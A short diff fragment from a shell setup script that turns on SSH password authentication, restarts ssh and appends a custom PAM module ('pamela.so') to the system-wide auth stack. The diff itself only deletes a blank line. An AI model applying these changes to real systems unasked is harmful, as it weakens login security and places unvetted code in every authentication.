@@ -8,5 +8,4 @@ sed -i "/PasswordAuthentication no/c\PasswordAuthentication yes" /etc/ssh/sshd_c
 service ssh restart
 
 echo "auth required pamela.so" >> /etc/pam.d/common-auth
-
 echo "DAMN SON, Ready to fire"
